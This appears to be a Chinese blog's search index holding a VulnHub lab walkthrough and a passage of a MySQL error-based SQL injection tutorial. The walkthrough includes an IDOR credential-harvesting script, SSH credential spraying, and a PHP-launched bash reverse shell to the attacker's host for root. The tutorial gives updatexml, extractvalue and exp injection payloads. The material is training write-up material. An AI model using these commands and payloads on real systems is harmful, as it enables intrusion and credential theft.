<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MeandMyGirlfriend Walkthrough</title>
      <link href="/posts/41077065.html"/>
      <url>/posts/41077065.html</url>
      
        <content type="html"><![CDATA[<h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -p- -sT 10.10.10.162 --min-rate 10000 -oA nmapscan/ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">$ sudo nmap -p22,80 -sT -sV -sC -O 10.10.10.162 -oA nmapscan/detail</span><br><span class="line">PORT   STATE SERVICE VERSION                                                                     </span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)             </span><br><span class="line">| ssh-hostkey:                                                                                    </span><br><span class="line">|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)</span><br><span class="line">|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)</span><br><span class="line">|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)                                  </span><br><span class="line">|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>进入 Web 页面，只有一句话：Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<br>查看源码，提示需要加入 HTTP 头 <strong>X-Forwarded-For</strong> ：<code>&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</code></p><blockquote><p>[!note] X-Forwarded-For<br>X-Forwarded-For 是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 头字段。</p></blockquote><p>综上，我们将 X-Forwarded-For 的值设为 127.0.0.1 绕过。<br><img src="https://raw.githubusercontent.com/viyrue/Picbed_personal/main/obsidian/202403301637010.png" alt="image.png"></p><p>目录扫描。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gobuster <span class="built_in">dir</span> -u http://10.10.10.162 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.sql,.html,.rar,.7z,.zip</span><br><span class="line">/.html                (Status: 403) [Size: 284]</span><br><span class="line">/.php                 (Status: 403) [Size: 283] </span><br><span class="line">/index.php            (Status: 200) [Size: 120]</span><br><span class="line">/misc                 (Status: 301) [Size: 310] [--&gt; http://10.10.10.162/misc/]</span><br><span class="line">/config               (Status: 301) [Size: 312] [--&gt; http://10.10.10.162/config/]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 32]</span><br><span class="line">/.php                 (Status: 403) [Size: 283]</span><br><span class="line">/.html                (Status: 403) [Size: 284]</span><br><span class="line">/server-status        (Status: 403) [Size: 292]</span><br></pre></td></tr></table></figure><p>访问 &#x2F;robots.txt，显示 Allow: &#x2F;heyhoo.txt</p><p>访问 &#x2F;heyhoo.txt，提示 Great! What you need now is reconn, attack and got the shell</p><p>测试登录页面，没有 SQL 注入。<br><img src="https://raw.githubusercontent.com/viyrue/Picbed_personal/main/obsidian/202403301700227.png" alt="image.png"></p><blockquote><p>[!note]<br>可以在 Burp 的设置 - Proxy - Match and replace rules 处添加规则，不用每次请求都手动添加 X-Forwarded-For</p></blockquote><p>在注册页注册一个账号，进入系统内。发现参数中有 id，可能存在水平越权。<br><img src="https://raw.githubusercontent.com/viyrue/Picbed_personal/main/obsidian/202403301704635.png" alt="image.png|505"></p><p>在 profile 页泄露出用户名和明文密码，且可以水平越权。<br><img src="https://raw.githubusercontent.com/viyrue/Picbed_personal/main/obsidian/202403301706122.png" alt="image.png|805"><br><img src="https://raw.githubusercontent.com/viyrue/Picbed_personal/main/obsidian/202403301709734.png" alt="image.png|415"></p><h1 id="Getting-Initial-Foothold"><a href="#Getting-Initial-Foothold" class="headerlink" title="Getting Initial Foothold"></a>Getting Initial Foothold</h1><p>写一个 Python 脚本获取所有凭据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;10.10.10.162&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh,en-US;q=0.7,en;q=0.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=p89uf2namqfqfe2of8hel8ed06&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://10.10.10.162/?page=profile&amp;user_id=<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">    r = requests.get(url=url, headers=headers)</span><br><span class="line">    page = etree.HTML(r.text)</span><br><span class="line">    name = page.xpath(<span class="string">&#x27;//*[@id=&quot;name&quot;]/@value&#x27;</span>)</span><br><span class="line">    username = page.xpath(<span class="string">&#x27;//*[@id=&quot;username&quot;]/@value&#x27;</span>)</span><br><span class="line">    password = page.xpath(<span class="string">&#x27;//*[@id=&quot;password&quot;]/@value&#x27;</span>)</span><br><span class="line">    cred = <span class="string">f&quot;<span class="subst">&#123;name[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;username[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;password[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(cred)</span><br></pre></td></tr></table></figure><p>awk 取出用户名和密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python3 getcreds.py &gt; creds.txt</span><br><span class="line">$ <span class="built_in">cat</span> creds.txt </span><br><span class="line">Eweuh Tandingan:eweuhtandingan:skuyatuh</span><br><span class="line">Aing Maung:aingmaung:qwerty!!!</span><br><span class="line">Sunda Tea:sundatea:indONEsia</span><br><span class="line">Sedih Aing Mah:sedihaingmah:cedihhihihi</span><br><span class="line">Alice Geulis:alice:4lic3</span><br><span class="line">::</span><br><span class="line">::</span><br><span class="line">::</span><br><span class="line">Abdi Kasep:abdikasepak:dorrrrr</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> creds.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; username</span><br><span class="line">$ <span class="built_in">cat</span> creds.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; pass</span><br></pre></td></tr></table></figure><p>使用 crackmapexec 枚举出可以连接 SSH 的凭据，得到 alice 用户的初始立足点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec ssh 10.10.10.162 -u username -p pass --continue-on-success</span><br><span class="line">SSH         10.10.10.162    22     10.10.10.162     [+] alice:4lic3</span><br><span class="line"></span><br><span class="line">$ ssh alice@10.10.10.162                                                         </span><br><span class="line">alice@gfriEND:~$ <span class="built_in">whoami</span></span><br><span class="line">alice</span><br><span class="line">alice@gfriEND:~$ <span class="built_in">export</span> TERM=xterm-color</span><br></pre></td></tr></table></figure><p>拿到 flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ <span class="built_in">ls</span></span><br><span class="line">flag1.txt  my_notes.txt</span><br><span class="line"></span><br><span class="line">alice@gfriEND:~/.my_secret$ <span class="built_in">cat</span> flag1.txt </span><br><span class="line">Greattttt my brother! You saw the Alice<span class="string">&#x27;s note! Now you save the record information to give to bob! I know if it&#x27;</span>s given to him <span class="keyword">then</span> Bob will be hurt but this is better than Bob cheated!</span><br><span class="line">Now your last job is get access to the root and <span class="built_in">read</span> the flag ^_^</span><br><span class="line">Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span><br><span class="line"></span><br><span class="line">alice@gfriEND:~/.my_secret$ <span class="built_in">cat</span> my_notes.txt </span><br><span class="line">Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn<span class="string">&#x27;t know my notes</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>sudo 权限枚举，可以运行 php.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure><p>向 php 文件中写入 payload 提权，但得到的 root shell 没有回显。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?php exec(\&quot;/bin/bash -p\&quot;);?&gt;&quot;</span> &gt;&gt; root.php</span><br><span class="line">alice@gfriEND:~$ sudo /usr/bin/php root.php </span><br><span class="line">root@gfriEND:~<span class="comment"># id</span></span><br></pre></td></tr></table></figure><blockquote><p>[!hint]<br>因为第一个 payload 在 PHP 代码中调用了 <code>exec</code> 函数来执行 <code>/bin/bash -p</code>，但是没有输出到标准输出(stdout)。因此不会看到任何直接的回显。应该用 <code>system()</code> 函数来执行命令：<code>sudo /usr/bin/php -r &quot;system(&#39;/bin/bash -p&#39;);&quot;</code>，这个函数在执行命令后会将结果输出到标准输出(stdout)。<code>-r</code> 选项允许在命令行中直接执行 PHP 代码。</p></blockquote><p>写入 reverse shell，sudo 执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?php exec(\&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.138/443 0&gt;&amp;1&#x27;\&quot;);?&gt;&quot;</span> &gt;&gt; shell.php</span><br><span class="line">alice@gfriEND:~$ sudo /usr/bin/php shell.php</span><br></pre></td></tr></table></figure><p>开启监听，得到 root 权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nc -lvnp 443                                                                              </span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.10.138] from (UNKNOWN) [10.10.10.162] 44646</span><br><span class="line">root@gfriEND:~<span class="comment"># id     </span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)  </span><br><span class="line">root@gfriEND:~<span class="comment"># cat /root/flag2.txt </span></span><br><span class="line"><span class="built_in">cat</span> /root/flag2.txt       </span><br><span class="line">________        __    ___________.__             ___________.__                ._.</span><br><span class="line"> /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |</span><br><span class="line">/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  &gt;|</span><br><span class="line"> \______  /\____/|__|     |____|   |___|  /\___  &gt;  \___  /   |____(____  /\___  /__</span><br><span class="line">        \/                              \/     \/       \/              \//_____/ \/</span><br><span class="line">Yeaaahhhh!! You have successfully hacked this company server! I hope you <span class="built_in">who</span> have just learned can get new knowledge from here :) I really hope yo</span><br><span class="line">u guys give me feedback <span class="keyword">for</span> this challenge whether you like it or not because it can be a reference <span class="keyword">for</span> me to be even better! I hope this can cont</span><br><span class="line">inue :)</span><br><span class="line">Contact me <span class="keyword">if</span> you want to contribute / give me feedback / share your writeup!</span><br><span class="line">Twitter: @makegreatagain_</span><br><span class="line">Instagram: @aldodimas73</span><br><span class="line">Thanks! Flag 2: gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>进入 Web 界面，显示该网站只能通过本地访问，源代码注释中提示需要使用 HTTP 请求头 X-Forwarded-For，我们添加 <code>X-Forwarded-For: 127.0.0.1</code> 绕过限制。注册账号登录进系统，在 profile 处泄露出用户名和密码，并且可以水平越权获取到其它用户凭据。最终使用 alice 用户凭据连接到 SSH，得到初始权限。<br>枚举系统发现用户具有 php 的sudo 权限，sudo 执行 php 的反弹 shell 得到 root 权限。</p>]]></content>
      
      
      <categories>
          
          <category> Walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 报错注入总结</title>
      <link href="/posts/4d79e97b.html"/>
      <url>/posts/4d79e97b.html</url>
      
        <content type="html"><![CDATA[<p>报错注入指通过<br>而显示错误则需要在开发程序中采用 <code>print_r mysql_error()</code> 函数，将 MySQL 错误信息输出。</p><h1 id="xpath-报错"><a href="#xpath-报错" class="headerlink" title="xpath 报错"></a>xpath 报错</h1><hr><p>Mysql 从 <strong>5.1.5</strong> 版本开始，MySQL 提供了两个用于<strong>查询和修改 XML 的函数</strong>：<code>updatexml</code> 和 <code>extratvalue</code>. 前者负责修改查询到的内容，后者负责在 XML 文档中按照 XPATH 语法查询节点内容。</p><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><h3 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h3><p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code>：Return replaced XML fragment.</p><ul><li><code>xml_target</code>：给定的 XML 标记片段。</li><li><code>xpath_expr</code>：用户提供的 XPATH 表达式，即要修改的 XML 片段路径。</li><li><code>new_xml</code>：要替换的新 XML 片段。</li></ul><p>函数功能：将 <code>xml_target</code> 中与 <code>xpath_expr</code> 相匹配的部分替换为给定的 <code>new_xml</code>，然后返回更改后的 XML.<br>如果没有发现匹配 <code>xpath_expr</code> 参数的表达式，或找到多个匹配项，则返回原始的 xml_target 片段。三个参数均为字符串，若其中任何一个为 NULL，则函数返回 NULL. </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>,<span class="string">&#x27;&lt;d&gt;ddd&lt;/d&gt;&#x27;</span>) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">value</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>d<span class="operator">&gt;</span>ddd<span class="operator">&lt;</span><span class="operator">/</span>d<span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br></pre></td></tr></table></figure><p><strong>Error handling</strong>：使用的 XPath 定位器必须有效，并且要搜索的 XML 必须由正确嵌套和闭合的元素组成。如果定位器无效，则会生成错误：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/&amp;a&#x27;</span>,<span class="string">&#x27;&lt;d&gt;d&lt;/d&gt;&#x27;</span>) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&amp;a&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h3><p>利用 <code>updatexml</code> 的报错处理机制，当参数 <code>xpath_expr</code> 为&#x3D;&#x3D;不合法的 XPATH 表达式&#x3D;&#x3D;时，系统将以报错形式返回我们输入的具体不符合规范的字符串。</p><p>一般利用 <code>updatexml</code> 报错注入的 paylaod 如下，需要将要查询的语句写在 <code>xpath_expr</code> 参数处，并使用 <code>concat</code> 函数&#x3D;&#x3D;拼接不合法的 XPATH 字符&#x3D;&#x3D;。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,@<span class="variable">@version</span>,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.7.26~&#x27;</span></span><br></pre></td></tr></table></figure><p>0x7e 是 16 机制的波浪符 <code>~</code>，除此之外，不合法的 XPATH 字符包括但不限于：</p><ul><li>单引号(0x27) 和双引号(0x22).</li><li>反斜杠(0x5c).</li><li>小括号(0x28, 0x29).</li><li>其它特殊字符：冒号(0x3a)、星号(0x2a)等。</li></ul><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p><code>Extractvalue(xml_frag, xpath_expr)</code>: Extract a value from an XML string using XPath notation.</p><ul><li><code>xml_frag</code>：包含 XML 标记的字符串片段。</li><li><code>xpath_expr</code>：XPATH 表达式(locator).</li></ul><p>函数功能：返回第一个文本节点的 CDATA，即在 <code>xml_frag</code> 中定位 <code>xpath_expr</code> 相应的 XML 元素或节点。</p><ul><li>CDATA(Character Data)：在 XML 中，CDATA 是一种特殊的标记，用于包含文本数据，而不对其中的特殊字符进行转移。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;test&lt;/b&gt;&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a/b&#x27;</span>) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> test  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br></pre></td></tr></table></figure><p>其报错原理与 <code>Updatexml()</code> 相同。</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,@<span class="variable">@version</span>,<span class="number">0x7e</span>)) <span class="keyword">as</span> <span class="keyword">value</span>;</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.7.26~&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h1><hr><p>EXP 函数为 Double 型溢出，关于溢出原理可以看 [[基于 BIGINT 溢出错误的 SQLi|BIGINT 整型溢出]]。</p><p><code>Exp(X)</code>: 返回 e 的 X 次方值。当 <strong>X 大于 709</strong> 时，会发生溢出报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">709</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">exp</span>(<span class="number">709</span>)              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.218407461554972e307</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">710</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(710)&#x27;</span></span><br></pre></td></tr></table></figure><p>与 BIGINT 溢出相同，通过取反符造成溢出。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(~((select &#x27;</span>root<span class="variable">@localhost</span><span class="string">&#x27; from dual)))&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>[!hint]<br>在 MySQL 5.5.53 之后，exp() 报错不再返回我们查询的结果。</p></blockquote><h1 id="floor-rand"><a href="#floor-rand" class="headerlink" title="floor() + rand()"></a>floor() + rand()</h1><hr><h2 id="函数解释-1"><a href="#函数解释-1" class="headerlink" title="函数解释"></a>函数解释</h2><ul><li><code>Floor(X)</code>：返回不大于 X 的最大整数值。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">1.68</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="number">1.68</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br></pre></td></tr></table></figure><ul><li><code>Rand([N])</code>：返回 0 &lt;&#x3D; v &lt; 1.0 范围内的随机浮点值 v. <ul><li>如果没有指定参数 N，则返回一个 0 到 1 的随机浮点数。</li><li>如果指定了参数 N，则其作为 seed. 每次调用都会生成相同的随机数序列，因此返回值在每次执行中都相同。</li></ul></li></ul><h3 id="floor-rand-0-2"><a href="#floor-rand-0-2" class="headerlink" title="floor(rand(0)*2)"></a><code>floor(rand(0)*2)</code></h3><p><code>rand(0)</code> 生成 0 &lt;&#x3D; 1 的伪随机数，乘 2 后返回 0 &lt;&#x3D; 2 的数，配合 <code>floor()</code> 就可以生成确定的两个数：0 和 1。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br></pre></td></tr></table></figure><h3 id="group-by-与-count"><a href="#group-by-与-count" class="headerlink" title="group by 与 count(*)"></a><code>group by</code> 与 <code>count(*)</code></h3><p><code>group by</code> 